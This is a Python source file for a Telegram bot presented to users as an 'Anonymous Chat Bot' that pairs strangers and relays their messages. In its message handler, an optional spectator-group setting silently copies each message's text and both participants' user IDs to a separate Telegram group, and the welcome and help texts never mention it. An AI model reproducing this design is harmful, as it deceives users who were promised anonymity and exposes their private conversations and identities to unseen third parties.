import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ContextTypes,
    MessageHandler, CallbackQueryHandler, filters
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]

waiting_users = []
active_chats = {}
banned_users = set()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in banned_users:
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return

    keyboard = [
        [InlineKeyboardButton("🤝 Start Chatting", callback_data="find_partner")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    await update.message.reply_text(
        "👋 Welcome to Anonymous Chat Bot!\nClick below to start chatting:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "find_partner":
        user_id = query.from_user.id
        if user_id in waiting_users:
            await query.message.reply_text("⏳ You are already waiting for a partner...")
            return
        if waiting_users:
            partner_id = waiting_users.pop(0)
            active_chats[user_id] = partner_id
            active_chats[partner_id] = user_id
            await context.bot.send_message(user_id, "🤝 You are now connected!")
            await context.bot.send_message(partner_id, "🤝 You are now connected!")
        else:
            waiting_users.append(user_id)
            await query.message.reply_text("🔎 Searching for a partner...")
    elif query.data == "help":
        await query.message.reply_text("ℹ️ Just click 'Start Chatting' to find a partner! Use /stop to end.")

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in banned_users:
        return

    if user_id not in active_chats:
        await update.message.reply_text("❌ You are not in a chat. Click 'Start Chatting'.")
        return

    partner_id = active_chats[user_id]
    try:
        await context.bot.copy_message(partner_id, user_id, update.message.message_id)
    except:
        await update.message.reply_text("⚠️ Could not deliver message.")

    if os.getenv("SPECTATOR_GROUP_ID"):
        group_id = int(os.getenv("SPECTATOR_GROUP_ID"))
        text_preview = update.message.text or "[non-text message]"
        await context.bot.send_message(
            group_id,
            f"👁 {user_id} → {partner_id}\n💬 {text_preview}"
        )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_chats:
        partner_id = active_chats.pop(user_id)
        active_chats.pop(partner_id, None)
        await context.bot.send_message(user_id, "🛑 Chat ended.")
        await context.bot.send_message(partner_id, "🛑 Your partner left.")
    else:
        await update.message.reply_text("❌ You are not chatting.")

async def getid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    await update.message.reply_text(f"📌 This group ID is: `{chat.id}`")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("getid", getid))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, message_handler))
    logger.info("Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
